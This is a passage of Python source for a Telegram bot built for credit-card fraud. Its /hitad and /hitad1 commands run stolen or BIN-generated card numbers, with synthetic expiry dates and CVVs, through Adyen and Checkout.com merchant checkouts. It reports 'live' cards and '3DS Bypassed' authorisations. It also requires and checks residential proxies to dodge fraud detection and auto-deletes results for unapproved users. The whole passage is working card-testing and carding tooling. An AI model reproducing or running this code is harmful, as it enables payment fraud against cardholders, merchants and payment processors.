            site_domain = extract_clean_site_domain(merchant_name, url)
            merchant_disp = f"{html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else html.escape(merchant_name)
            note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
            
            if res['success']:
                resp_str = "Authorised"
                if res.get('3ds_resolved') or res.get('3ds_bypassed'):
                    resp_str += " (3DS Bypassed)"
                
                receipt_str = ""
                succ_url = res.get('receipt_url') or res.get('final_url') or res.get('redirect_url') or res.get('success_url') or res.get('3ds_url')
                succ_url_line = f"\n<b><i>Success URL</i></b> ➔ {html.escape(str(succ_url))}" if succ_url else ""
                
                time_str = f"{res.get('response_time', 0):.2f}s"
                msg = (
                    f"✅ <b><i>PAYMENT SUCCESSFUL [CHECKOUT.COM]</i></b>\n"
                    f"──────────────────────\n"
                    f"<b><i>CC</i></b> ➔ <code>{card_str}</code>\n"
                    f"<b><i>Amount</i></b> ➔ {html.escape(amount_val)}\n"
                    f"<b><i>Merchant</i></b> ➔ {merchant_disp}\n"
                    f"<b><i>Response</i></b> ➔ <code>{html.escape(resp_str)}</code>\n"
                    f"<b><i>Time</i></b> ➔ {time_str}"
                    f"{succ_url_line}\n"
                    f"──────────────────────"
                    f"{note_line}"
                )
            else:
                resp_str = res.get('error') or res.get('decline_code') or "Refused"
                time_str = f"{res.get('response_time', 0):.2f}s"
                
                msg = (
                    f"❌ <b><i>PAYMENT UNSUCCESSFUL</i></b>\n"
                    f"──────────────────────\n"
                    f"<b><i>CC</i></b> ➔ <code>{card_str}</code>\n"
                    f"<b><i>Amount</i></b> ➔ {html.escape(amount_val)}\n"
                    f"<b><i>Merchant</i></b> ➔ {merchant_disp}\n"
                    f"<b><i>Response</i></b> ➔ <code>{html.escape(resp_str)}</code>\n"
                    f"<b><i>Time</i></b> ➔ {time_str}\n"
                    f"──────────────────────"
                    f"{note_line}"
                )
                
            try:
                msg_obj = await message.answer(msg, disable_web_page_preview=True)
                if not is_approved:
                    asyncio.create_task(delete_msg_later(msg_obj, 30))
            except Exception as e:
                print(e)
                
    except Exception as e:
        import traceback
        traceback.print_exc()
        if status_msg:
            await status_msg.edit_text(f"<b>Fatal Error</b>\n<code>{str(e)}</code>")
        else:
            await message.answer(f"<b>Fatal Error</b>\n<code>{str(e)}</code>")
    finally:
        if user_id in active_sessions:
            del active_sessions[user_id]



def parse_ccn_input(payload_tokens: list, raw_payload: str):
    """
    Parses cards for CCN mode (no CVV required from user).
    Supported formats:
    1. card|mm|yy or card/mm/yy (3 parts)
    2. card|mm|yy|cvv (4 parts - CVV ignored)
    3. Raw card numbers: /hitad1 [url] 4111111111111111 (auto expiry)
    4. BIN generation: /hitad1 [url] 453590 [count=10]
    """
    import random
    from datetime import datetime

    def rand_expiry():
        now = datetime.now()
        future_months = random.randint(3, 48)
        m = now.month + future_months
        y = now.year + (m - 1) // 12
        m = ((m - 1) % 12) + 1
        return str(m).zfill(2), str(y)[-2:]

    cards = []

    # 1. Check for card|mm|yy|cvv (4 parts)
    full_matches = re.findall(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})', raw_payload)
    matched_cards = set()
    for m in full_matches:
        card_num = m[0]
        m_val = m[1].zfill(2)
        y_val = m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:]
        matched_cards.add(f"{card_num}|{m_val}|{y_val}")
        cards.append({
            'card': card_num,
            'month': m_val,
            'year': y_val,
            'cvv': m[3]
        })

    # 2. Check for card|mm|yy (3 parts - CCN format, assign synthetic CVV)
    ccn_matches = re.findall(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})', raw_payload)
    for m in ccn_matches:
        card_num = m[0]
        m_val = m[1].zfill(2)
        y_val = m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:]
        card_key = f"{card_num}|{m_val}|{y_val}"
        if card_key not in matched_cards:
            matched_cards.add(card_key)
            synth_cvv = f"{random.randint(1000, 9999):04d}" if m[0].startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
            cards.append({
                'card': card_num,
                'month': m_val,
                'year': y_val,
                'cvv': synth_cvv
            })

    if cards:
        if len(cards) > 10:
            return None, "Max concurrent limit is 10."
        return cards, None

    # 3. Check for BIN pattern
    if payload_tokens:
        count_val = payload_tokens[-1]
        count = 10
        potential_bin = ""

        if count_val.isdigit() and len(count_val) <= 3 and len(payload_tokens) >= 2:
            count = int(count_val)
            potential_bin = "".join(payload_tokens[:-1]).strip()
        else:
            potential_bin = "".join(payload_tokens).strip()

        clean_bin_prefix = potential_bin.split('|')[0].lower().replace(' ', '')
        if 'x' in clean_bin_prefix or (clean_bin_prefix.isdigit() and len(clean_bin_prefix) >= 6 and len(clean_bin_prefix) < 16):
            if count > 10:
                return None, "Maximum batch limit is 10 concurrent requests."
            from generators import generate_bin_cards
            raw_gen_cards = generate_bin_cards(potential_bin, count)
            for gc in raw_gen_cards:
                gp = gc.split('|')
                cards.append({'card': gp[0], 'month': gp[1], 'year': gp[2], 'cvv': gp[3]})
            if not cards:
                return None, "BIN pattern generation failed."
            return cards, None

    # 4. Raw card numbers (just digits) - fallback with random expiry and synthetic CVV
    raw_numbers = re.findall(r'\b(\d{13,19})\b', raw_payload)
    if raw_numbers:
        for num in raw_numbers[:10]:
            m, y = rand_expiry()
            synth_cvv = f"{random.randint(1000, 9999):04d}" if num.startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
            cards.append({'card': num, 'month': m, 'year': y, 'cvv': synth_cvv})
        return cards, None

    return None, "Invalid format. Usage:\n/hitad1 [url] cc|mm|yy ...\nOR\n/hitad1 [url] [bin_pattern] [count=10]"

@dp.message(Command("hitad1"))
async def hitad1_command(message: types.Message):
    user_id = message.from_user.id

    if not gate_adyen_enabled and str(user_id) != str(OWNER_ID):
        await message.answer("🚧 <b>Gateway Offline</b>\n<code>Adyen checkout engine is currently disabled by admin.</code>")
        return

    if user_id in active_sessions:
        await message.answer("<b>Alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
        return

    if not await ProxyManager.has_proxies(user_id):
        await message.answer(
            "⚠️ <b>Proxy Required</b>\n"
            "<code>Proxy pool is empty. You must load active proxies before hitting.\n"
            "Load proxies using /proxy or /getproxy.</code>"
        )
        return

    raw_tokens = message.text.strip().split()
    if len(raw_tokens) < 3:
        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitad1 [url] [card_number1] [card_number2]\nOR\n/hitad1 [url] [bin_pattern] [count=10]</code>")
        return

    url = raw_tokens[1]
    payload_tokens = raw_tokens[2:]
    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else (payload_tokens[0] if payload_tokens else "")

    cards, err = parse_ccn_input(payload_tokens, raw_payload)
    if err:
        await message.answer(f"<b>Error</b>\n<code>{err}</code>")
        return

    status_msg = await message.answer("cooking....")
    session_token = time.time()
    active_sessions[user_id] = session_token

    try:
        from adyen_hitter import AdyenHitter
        proxy_data = await ProxyManager.get_random(user_id)

        card_blocks = []
        merchant_name = "Adyen Merchant"
        amount_str = None
        results = []
        link_dead = False

        for idx, card in enumerate(cards, 1):
            if active_sessions.get(user_id) != session_token or link_dead:
                break

            if idx > 1:
                await asyncio.sleep(random.uniform(0.5, 1.0))

            adyen_engine = AdyenHitter(url, proxy_data=proxy_data)
            res = await adyen_engine.hit_ccn(card, idx, user_id)
            results.append(res)

            if is_session_expired_err(res):
                link_dead = True
                try:
                    await status_msg.edit_text(
                        "<b>[!] Session Expired</b>"
                    )
                except Exception:
                    pass
                break

            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card'].get('cvv', '000')}"
            merchant_name = res.get('merchant') or merchant_name
            if res.get('amount'):
                amount_str = res['amount']
            site_domain = extract_clean_site_domain(merchant_name, url)
            is_approved = user_id in approved_users_set

            if len(cards) > 1:
                status_str = "Payment Successful ✅" if res['success'] else ("LIVE CARD 🔥" if res.get('is_live') else "Payment Failed ❌")

                if res['success']:
                    resp_str = "Authorised"
                    if res.get('3ds_resolved'):
                        resp_str += " (3DS Bypassed)"
                else:
                    resp_str = res.get('error') or res.get('decline_code') or 'Refused'

                block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
                card_blocks.append(block)

                site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
                
                # Telegram message length overflow guard
                visible_blocks = card_blocks
                while len("\n\n".join(visible_blocks)) > 3500 and len(visible_blocks) > 1:
                    visible_blocks = visible_blocks[1:]
                blocks_text = "\n\n".join(visible_blocks)

                msg_text = (
                    f"<b>Adyen CCN Hitter</b>\n\n"
                    f"{blocks_text}\n\n"
                    f"{site_line}"
                    f"{amt_line}"
                )

                try:
                    await status_msg.edit_text(msg_text, disable_web_page_preview=True)
                except Exception:
                    pass

            elif len(cards) == 1:
                if status_msg:
                    try: await status_msg.delete()
                    except: pass

                amount_val = res.get('amount') or amount_str or "N/A"
                merchant_disp = f"{html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else html.escape(merchant_name)
                note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"

                if res.get('success'):
                    succ_url = res.get('receipt_url') or res.get('final_url') or res.get('redirect_url') or res.get('success_url') or res.get('3ds_url')
                    succ_url_line = f"\n<b><i>Success URL</i></b> ➔ {html.escape(str(succ_url))}" if succ_url else ""
                    hit_text = (
                        f"✅ <b><i>PAYMENT SUCCESSFUL [ADYEN CCN]</i></b>\n"
                        f"──────────────────────\n"
                        f"<b><i>CC</i></b> ➔ <code>{card_str}</code>\n"
                        f"<b><i>Amount</i></b> ➔ {amount_val}\n"
                        f"<b><i>Merchant</i></b> ➔ {merchant_disp}\n"
                        f"<b><i>Time</i></b> ➔ {res.get('response_time', 0):.2f}s"
                        f"{succ_url_line}\n"
                        f"──────────────────────"
                        f"{note_line}"
                    )
                else:
                    reason_msg = html.escape(str(res.get('error') or res.get('decline_code') or 'refused')[:250])
                    hit_text = (
                        f"❌ <b><i>PAYMENT UNSUCCESSFUL</i></b>\n"
                        f"──────────────────────\n"
                        f"<b><i>CC</i></b> ➔ <code>{card_str}</code>\n"
                        f"<b><i>Amount</i></b> ➔ {amount_val}\n"
                        f"<b><i>Merchant</i></b> ➔ {merchant_disp}\n"
                        f"<b><i>Response</i></b> ➔ {reason_msg}\n"
                        f"<b><i>Time</i></b> ➔ {res.get('response_time', 0):.2f}s\n"
                        f"──────────────────────" + note_line
                    )

                sent_msg = await message.reply(hit_text, disable_web_page_preview=True)
                if not is_approved:
                    async def auto_del_ccn(m):
                        await asyncio.sleep(30)
                        try: await m.delete()
                        except: pass
                    asyncio.create_task(auto_del_ccn(sent_msg))

        if len(cards) > 1 and not is_approved and status_msg:
            async def auto_del_ccn(m):
                await asyncio.sleep(30)
                try: await m.delete()
                except: pass
            asyncio.create_task(auto_del_ccn(status_msg))

    except Exception as ex:
        if status_msg:
            try: await status_msg.delete()
            except: pass
        await message.answer(f"❌ <b>Error processing Adyen CCN check:</b>\n<code>{html.escape(str(ex))}</code>")
    finally:
        if active_sessions.get(user_id) == session_token:
            del active_sessions[user_id]


@dp.message(Command("hitad"))
async def hitad_command(message: types.Message):
    user_id = message.from_user.id
    
    if not gate_adyen_enabled and str(user_id) != str(OWNER_ID):
        await message.answer("🚧 <b>Gateway Offline</b>\n<code>Adyen checkout engine is currently disabled by admin.</code>")
        return

    if user_id in active_sessions:
        await message.answer("<b>Alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
        return

    # Naked IP Block - Mandatory Proxy Requirement
    if not await ProxyManager.has_proxies(user_id):
        await message.answer(
            "⚠️ <b>Proxy Required</b>\n"
            "<code>Proxy pool is empty. You must load active proxies before hitting.\n"
            "Load proxies using /proxy or /getproxy.</code>"
        )
        return

    raw_tokens = message.text.strip().split()
    if len(raw_tokens) < 3 and not (len(raw_tokens) == 3 or (len(raw_tokens) == 2 and any(c.isdigit() or c == 'x' for c in raw_tokens[-1]))):
        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitad [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hitad [url] [bin_pattern] [count=10]</code>")
        return
        
    url = raw_tokens[1]
    payload_tokens = raw_tokens[2:]
    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else (payload_tokens[0] if payload_tokens else "")
    
    cards, err = parse_cards_input(payload_tokens, raw_payload)
    if err:
        await message.answer(f"<b>Error</b>\n<code>{err}</code>")
        return

    status_msg = await message.answer("cooking....")
    session_token = time.time()
    active_sessions[user_id] = session_token
    
    try:
        from adyen_hitter import AdyenHitter
        proxy_data = await ProxyManager.get_random(user_id)
        
        card_blocks = []
        merchant_name = "Adyen Merchant"
        amount_str = None
        results = []

        for idx, card in enumerate(cards, 1):
            if active_sessions.get(user_id) != session_token:
                break

            if idx > 1:
                await asyncio.sleep(random.uniform(0.5, 1.0))

            adyen_engine = AdyenHitter(url, proxy_data=proxy_data)
            res = await adyen_engine.hit(card, idx, user_id)
            results.append(res)
            
            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
            merchant_name = res.get('merchant') or merchant_name
            if res.get('amount'):
                amount_str = res['amount']

            site_domain = extract_clean_site_domain(merchant_name, url)

            if len(cards) > 1:
                status_str = "Payment Successful ✅" if res['success'] else "Payment Failed ❌"
                
                if res['success']:
                    resp_str = "Authorised"
                    if res.get('3ds_resolved') or res.get('3ds_bypassed'):
                        resp_str += " (3DS Bypassed)"
                else:
                    resp_str = res.get('error') or res.get('decline_code') or "Refused"

                block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
                succ_url_line = extract_success_url_line(res)
                if succ_url_line:
                    block += succ_url_line
                
                expired = is_session_expired_err(res)
                if expired:
                    block += "\n<b>[!] Session Expired</b>"

                card_blocks.append(block)

                site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
                
                # Telegram message length overflow guard
                visible_blocks = card_blocks
                while len("\n\n".join(visible_blocks)) > 3500 and len(visible_blocks) > 1:
                    visible_blocks = visible_blocks[1:]
                blocks_text = "\n\n".join(visible_blocks)

                msg_text = (
                    f"<b>Adyen Checkout Hitter</b>\n\n"
                    f"{blocks_text}\n\n"
                    f"{site_line}"
                    f"{amt_line}"
                )

                try:
                    await status_msg.edit_text(msg_text, disable_web_page_preview=True)
                except Exception:
                    pass

                if expired:
                    break

        is_approved = user_id in approved_users_set

        if len(cards) == 1 and results:
            if status_msg:
                try: await status_msg.delete()
                except: pass

            res = results[0]
            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
            merchant_name = res.get('merchant') or merchant_name
            amount_val = res.get('amount') or amount_str or "USD 0.00"
            site_domain = extract_clean_site_domain(merchant_name, url)
            merchant_disp = f"{html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else html.escape(merchant_name)
            note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"

            if res.get('success'):
                succ_url = res.get('receipt_url') or res.get('final_url') or res.get('redirect_url') or res.get('success_url') or res.get('3ds_url')
                succ_url_line = f"\n<b><i>Success URL</i></b> ➔ {html.escape(str(succ_url))}" if succ_url else ""
                hit_text = (
                    f"✅ <b><i>PAYMENT SUCCESSFUL [ADYEN]</i></b>\n"
                    f"──────────────────────\n"
                    f"<b><i>CC</i></b> ➔ <code>{card_str}</code>\n"
                    f"<b><i>Amount</i></b> ➔ {amount_val}\n"
                    f"<b><i>Merchant</i></b> ➔ {merchant_disp}\n"
                    f"<b><i>Time</i></b> ➔ {res.get('response_time', 0):.2f}s"
                    f"{succ_url_line}\n"
                    f"──────────────────────"
                    f"{note_line}"
                )
            else:
                reason_msg = html.escape(str(res.get('error') or res.get('decline_code') or 'refused')[:250])
                hit_text = (
                    f"❌ <b><i>PAYMENT UNSUCCESSFUL</i></b>\n"
                    f"──────────────────────\n"
                    f"<b><i>CC</i></b> ➔ <code>{card_str}</code>\n"
                    f"<b><i>Amount</i></b> ➔ {amount_val}\n"
                    f"<b><i>Merchant</i></b> ➔ {merchant_disp}\n"
                    f"<b><i>Response</i></b> ➔ {reason_msg}\n"
                    f"<b><i>Time</i></b> ➔ {res.get('response_time', 0):.2f}s\n"
                    f"──────────────────────" + note_line
                )

            sent_msg = await message.reply(hit_text, disable_web_page_preview=True)
            if not is_approved:
                async def auto_del_ad(m):
                    await asyncio.sleep(30)
                    try: await m.delete()
                    except: pass
                asyncio.create_task(auto_del_ad(sent_msg))
        elif len(cards) > 1 and not is_approved and status_msg:
            async def auto_del_ad(m):
                await asyncio.sleep(30)
                try: await m.delete()
                except: pass
            asyncio.create_task(auto_del_ad(status_msg))

    except Exception as ex:
        if status_msg:
            try: await status_msg.delete()
            except: pass
        await message.answer(f"❌ <b>Error processing Adyen check:</b>\n<code>{html.escape(str(ex))}</code>")
    finally:
        if active_sessions.get(user_id) == session_token:
            del active_sessions[user_id]

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    user_id = message.from_user.id
    if user_id in active_sessions:
        hitter = active_sessions[user_id]
        if hasattr(hitter, 'is_running'):
            hitter.is_running = False
        del active_sessions[user_id]
        await message.answer("<b>Status</b>\n<code>Session termination requested. Pending final queue execution.</code>")
    else:
        await message.answer("<b>Status</b>\n<code>No active sessions found.</code>")




@dp.message(Command("setlog"))
async def setlog_command(message: types.Message):
    user_id = message.from_user.id
    if not OWNER_ID or str(user_id) != str(OWNER_ID):
        await message.answer("<b>Error</b>\n<code>Unauthorized command. Only the owner can use /setlog.</code>")
        return
    global LOG_GROUP_ID
    LOG_GROUP_ID = str(message.chat.id)
    with open(".env", "a") as f:
        f.write(f"\nLOG_GROUP_ID={LOG_GROUP_ID}")
    await message.answer(f"✅ Log group set permanently! (ID: {LOG_GROUP_ID})\nAll successes and proxies will be forwarded here.")

@dp.message(Command("proxystatus"))
async def proxystatus_command(message: types.Message):
    count = await ProxyManager.get_count(message.from_user.id)
    if count == 0:
        await message.answer("<b>Proxy Status</b>\n<code>Pool is empty.</code>")
    else:
        await message.answer(f"<b>Proxy Status</b>\n<code>Active pool count: {count}</code>")

@dp.message(Command("offproxy"))
async def offproxy_command(message: types.Message):
    await ProxyManager.clear(message.from_user.id)
    await message.answer(
        "🔌 <b>Proxy Status</b>\n"
        "<code>Proxy pool cleared.\n"
        "⚠️ Note: Active proxies are required to run /hit or /hitad. Load proxies via /proxy or /getproxy.</code>"
    )

async def test_proxy_single(p, is_pool, user_id, sem):
    async with sem:
        loop = asyncio.get_running_loop()
        server = p['server']
        auth = f"{p['username']}:{p['password']}@" if p.get('username') else ""
        scheme = server.split('://')[0] if '://' in server else 'http'
        server_host = server.split('://')[-1]
        proxy_url = f"{scheme}://{auth}{server_host}"

        if server.startswith('socks5://'):
            proxy_url = f"socks5://{auth}{server.replace('socks5://', '')}"
        elif server.startswith('socks4://'):
            proxy_url = f"socks4://{auth}{server.replace('socks4://', '')}"
            
        proxies = {"http": proxy_url, "https": proxy_url}
        
        def _check():
            last_err = ""
            import time
            start_t = time.time()
            try:
                resp = curl_get("https://api.ipify.org?format=json", proxies=proxies, timeout=10, impersonate="chrome124")
                latency_ms = int((time.time() - start_t) * 1000)
                if resp.status_code == 200:
                    proxy_ip = resp.json().get('ip')
                    is_weak = False
                    if proxy_ip:
                        try:
                            check_resp = curl_get(f"http://proxycheck.io/v2/{proxy_ip}?vpn=1&asn=1&risk=1", proxies=proxies, timeout=5, impersonate="chrome124")
                            if check_resp.status_code == 200:
                                ip_data = check_resp.json()
                                if ip_data.get("status") == "ok":
                                    for key, val in ip_data.items():
                                        if key not in ["status", "node", "query_time", "message"]:
                                            ip_type = str(val.get("type", "Unknown"))
                                            risk = val.get("risk", 0)
                                            if "Datacenter" in ip_type or "VPN" in ip_type or "Business" in ip_type or risk > 33:
                                                is_weak = True
                                            break
                        except Exception:
                            pass
                    return True, False, is_weak, p['raw'], "", latency_ms
                elif resp.status_code == 407:
                    return False, True, False, p['raw'], "407 Auth Required (Whitelist Server IP)", 0
                else:
                    return False, True, False, p['raw'], f"HTTP {resp.status_code}", 0
            except Exception as e:
                err_str = str(e)
                if "407" in err_str:
                    return False, True, False, p['raw'], "407 Auth Required (Whitelist Server IP)", 0
                return False, True, False, p['raw'], "Timeout/Failed", 0

        return await loop.run_in_executor(None, _check)

async def test_proxy_list(proxies_to_test, is_pool, user_id, status_msg=None):
    live_proxies = []
    dead_proxies = []
    weak_proxies = []
    error_reasons = set()

    total = len(proxies_to_test)
    completed_count = 0
    sem = asyncio.Semaphore(20)
    import time
    last_edit_time = 0
    spinners = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

    async def _worker(p):
        nonlocal completed_count, last_edit_time
        res = await test_proxy_single(p, is_pool, user_id, sem)
        completed_count += 1

        success, is_dead, is_weak, raw, err, latency = res
        if success:
            live_proxies.append(raw)
            if is_weak:
                weak_proxies.append(raw)
        if is_dead:
            dead_proxies.append(raw)
            if err:
                error_reasons.add(err)
            if is_pool:
                await ProxyManager.remove(user_id, raw)

        now = time.time()
        if status_msg and (now - last_edit_time >= 0.8 or completed_count == total):
            last_edit_time = now
            pct = int((completed_count / total) * 100)
            filled = int((completed_count / total) * 10)
            bar = "■" * filled + "□" * (10 - filled)
            spin = spinners[completed_count % len(spinners)]
            try:
                await status_msg.edit_text(
                    f"⚡ <b>[{spin}] Checking Proxies... {pct}%</b>\n\n"
                    f"<code>[{bar}] {completed_count}/{total}</code>\n"
                    f"<code>🟢 Live : {len(live_proxies)}  |  🔴 Dead : {len(dead_proxies)}</code>"
                )
            except Exception:
                pass
        return res

    tasks = [_worker(p) for p in proxies_to_test]
    await asyncio.gather(*tasks)

    return live_proxies, dead_proxies, weak_proxies, list(error_reasons)

@dp.message(Command("allproxies", "allproxy"))
async def allproxies_command(message: types.Message):
    if not message.from_user:
        return
    user_id = message.from_user.id
    if not OWNER_ID or str(user_id) != str(OWNER_ID):
        return
        
    db_pool = ProxyManager.db_pool
    if not db_pool:
        await message.answer("📁 <b>Database connection not active.</b>")
        return
        
    async with db_pool.acquire() as conn:
        rows = await conn.fetch("SELECT user_id, proxies FROM user_proxies")
        
    unique_proxies = []
    seen = set()
    total_loaded = 0
    
    for row in rows:
        if row['proxies']:
            import json
            try:
                user_proxies = json.loads(row['proxies'])
                for p in user_proxies:
                    raw_p = (p.get('raw') or p.get('server') or '').strip()
                    if raw_p:
                        total_loaded += 1
                        if raw_p not in seen:
                            seen.add(raw_p)
                            unique_proxies.append(raw_p)
            except Exception:
                pass

    if not unique_proxies:
        await message.answer("📁 <b>No proxies loaded in database across any users.</b>")
        return

    temp_dir = os.path.join(os.path.dirname(__file__), 'temp')
    os.makedirs(temp_dir, exist_ok=True)
    temp_file_path = os.path.join(temp_dir, 'all_proxies.txt')
    
    with open(temp_file_path, 'w', encoding='utf-8') as f:
        f.write("\n".join(unique_proxies) + "\n")
        
    await message.reply_document(
        document=FSInputFile(temp_file_path, filename="all_proxies.txt"),
        caption=f"📁 <b>All Active Proxies Exported</b>\n<code>Total Unique: {len(unique_proxies)} (Total Loaded: {total_loaded})</code>"
    )
    try:
        os.remove(temp_file_path)
    except Exception:
        pass

def parse_proxy_line(line: str) -> Optional[Dict]:
    line = line.strip()
    if not line: return None
    extracted = extract_all_proxies_from_text(line)
    return extracted[0] if extracted else None

def extract_all_proxies_from_text(raw_text: str) -> list:
    """
    Extracts all valid proxies from raw text, removing emojis, unwanted text, bullet points, tags.
    Supports line-by-line parsing for:
    - user:pass@ip_or_host:port
    - ip_or_host:port:user:pass
    - ip_or_host:port
    - http(s)://...
    - socks4/5://...
    """
    proxies = []
    seen = set()
    lines = raw_text.splitlines()

    HOST_PATTERN = r'(?:[a-zA-Z0-9_\-\.]+|\d{1,3}(?:\.\d{1,3}){3})'

    p1 = re.compile(r'(?:(https?|socks[45])://)?([a-zA-Z0-9_\-\.]+):([a-zA-Z0-9_\-\.]+)@(' + HOST_PATTERN + r'):(\d{1,5})', re.I)
    p2 = re.compile(r'(?:(https?|socks[45])://)?(' + HOST_PATTERN + r'):(\d{1,5}):([a-zA-Z0-9_\-\.]+):([a-zA-Z0-9_\-\.]+)', re.I)
    p3 = re.compile(r'(?:(https?|socks[45])://)?(' + HOST_PATTERN + r'):(\d{1,5})', re.I)

    for line in lines:
        line = re.sub(r'<[^>]+>', ' ', line).strip()
        if not line:
            continue

        m1 = p1.search(line)
        if m1:
            scheme = (m1.group(1) or 'http').lower()
            user, pwd, host, port = m1.group(2), m1.group(3), m1.group(4), m1.group(5)
            raw_p = f"{host}:{port}:{user}:{pwd}"
            if raw_p not in seen:
                seen.add(raw_p)
                proxies.append({
                    "raw": raw_p,
                    "server": f"{scheme}://{host}:{port}",
                    "username": user,
                    "password": pwd
                })
            continue

        m2 = p2.search(line)
        if m2:
            scheme = (m2.group(1) or 'http').lower()
            host, port, user, pwd = m2.group(2), m2.group(3), m2.group(4), m2.group(5)
            raw_p = f"{host}:{port}:{user}:{pwd}"
            if raw_p not in seen:
                seen.add(raw_p)
                proxies.append({
                    "raw": raw_p,
                    "server": f"{scheme}://{host}:{port}",
                    "username": user,
                    "password": pwd
                })
            continue

        m3 = p3.search(line)
        if m3:
            scheme = (m3.group(1) or 'http').lower()
            host, port = m3.group(2), m3.group(3)
            if '.' in host and not '@' in line:
                raw_p = f"{host}:{port}"
                if raw_p not in seen:
                    seen.add(raw_p)
                    proxies.append({
                        "raw": raw_p,
                        "server": f"{scheme}://{host}:{port}"
                    })

    return proxies

@dp.message(Command("proxy", "setproxy", "chkproxy", "checkproxy"))
async def proxy_command(message: types.Message):
    user_id = message.from_user.id

    raw_input_text = ""

    # Check attached file or reply file
    if message.document or (message.reply_to_message and message.reply_to_message.document):
        doc = message.document or message.reply_to_message.document
        if doc and (doc.file_name or "").lower().endswith(".txt"):
            try:
                file_info = await bot.get_file(doc.file_id)
                downloaded = await bot.download_file(file_info.file_path)
                raw_input_text = downloaded.read().decode('utf-8', errors='ignore')
            except Exception as e:
                await message.reply(f"❌ <b>File Download Error</b>\n<code>{str(e)}</code>")
                return

    if not raw_input_text and message.reply_to_message:
        raw_input_text = message.reply_to_message.text or message.reply_to_message.caption or ""

    if not raw_input_text:
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) > 1:
            raw_input_text = command_parts[1].strip()

    is_loading_new = bool(raw_input_text)
    proxies_to_test = []

    if is_loading_new:
        proxies_to_test = extract_all_proxies_from_text(raw_input_text)
    else:
        proxies_to_test = list(await ProxyManager.get_user_proxies(user_id))

    if not proxies_to_test:
        if is_loading_new:
            await message.answer("<b>Error</b>\n<code>Failed to parse proxies. Format: host:port:user:pass or user:pass@host:port</code>")
        else:
            await message.answer("<b>Error</b>\n<code>Proxy pool empty. Use /proxy host:port:user:pass or attach .txt file</code>")
        return

    status_msg = await message.answer(
        f"⚡ <b>[⠋] Checking Proxies... 0%</b>\n\n"
        f"<code>[□□□□□□□□□□] 0/{len(proxies_to_test)}</code>\n"
        f"<code>🟢 Live : 0  |  🔴 Dead : 0</code>"
    )

    # Test proxies with live updates
    live_proxies, dead_proxies, weak_proxies, err_reasons = await test_proxy_list(proxies_to_test, not is_loading_new, user_id, status_msg)

    live_count = len(live_proxies)
    dead_count = len(dead_proxies)
    weak_count = len(weak_proxies)
    total_tested = len(proxies_to_test)

    if is_loading_new:
        final_msg = (
            f"⚡ <b>Proxies Checked!</b>\n\n"
            f"<code>🟢 Live : {live_count} / {total_tested}</code>\n"
            f"<code>🔴 Dead : {dead_count}</code>"
        )
    else:
        final_msg = (
            f"⚡ <b>Proxy Pool Status</b>\n\n"
            f"<code>🟢 Live : {live_count} / {total_tested}</code>\n"
            f"<code>🔴 Dead : {dead_count}</code>"
        )

    if is_loading_new:
        if live_count == 0:
            err_str = ", ".join(err_reasons) if err_reasons else "All proxies failed"
            final_msg += f"\n<code>⚠️ Error: {err_str}</code>"
            await status_msg.edit_text(final_msg)
            return

        if not hasattr(bot, 'pasted_proxies_cache'):
            bot.pasted_proxies_cache = {}

        premium_raws = [p for p in live_proxies if p not in weak_proxies]
        bot.pasted_proxies_cache[user_id] = {
            'premium': premium_raws,
            'live': live_proxies
        }

        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        buttons = []
        if len(premium_raws) > 0:
            buttons.append([InlineKeyboardButton(text=f"➕ ADD PREMIUM ONLY ({len(premium_raws)})", callback_data="add_strong_only")])
        buttons.append([InlineKeyboardButton(text=f"➕ ADD ALL {live_count} PROXIES", callback_data="add_live_all")])

        markup = InlineKeyboardMarkup(inline_keyboard=buttons)
        await status_msg.edit_text(final_msg, reply_markup=markup)
    else:
        if dead_count > 0:
            final_msg += f"\n<code>Removed {dead_count} dead proxies from pool</code>"

        markup = None
        if weak_count > 0:
            if not hasattr(bot, 'weak_proxies_cache'):
                bot.weak_proxies_cache = {}
            bot.weak_proxies_cache[user_id] = weak_proxies

            from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
            markup = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=f"❌ PURGE WEAK PROXIES ({weak_count})", callback_data="rm_weak_proxies")]
            ])

        try:
            if markup:
                await status_msg.edit_text(final_msg, reply_markup=markup)
            else:
                await status_msg.edit_text(final_msg)
        except Exception:
            if markup:
